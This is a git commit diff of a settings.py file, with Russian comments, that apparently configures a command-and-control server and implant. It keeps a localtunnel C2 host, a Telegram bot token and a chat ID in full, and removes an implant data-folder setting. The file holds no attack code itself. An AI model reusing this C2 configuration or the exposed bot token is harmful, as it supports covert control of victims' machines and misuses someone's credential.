cad64c25ce9496b5a3948e4b74125e30c69038a1
Linkor512 <98233831+Linkor512@users.noreply.github.com>
2025-09-01 22:48:58 +0400

    Update settings.py

--- settings.py
+++ settings.py
@@ -1,8 +1,3 @@
-#
-# --- Файл: settings.py (Финальная Версия) ---
-#
-import os
-
 # --- Постоянный Адрес Твоей Крепости ---
 # Мы используем постоянный субдомен в localtunnel.
 C2_HOST = "marka-c2-fortress-777.loca.lt"
@@ -15,7 +10,3 @@ LOCAL_C2_PORT = 8765
 # Твои личные токен и ID чата.
 BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34"
 CHAT_ID = "1640138978"
-
-# --- Настройки для Импланта ---
-# Системная папка для хранения файлов (пока не используется, но пусть будет).
-APP_DATA_PATH = os.path.join(os.getenv('LOCALAPPDATA'), 'SCoPeD_Data')
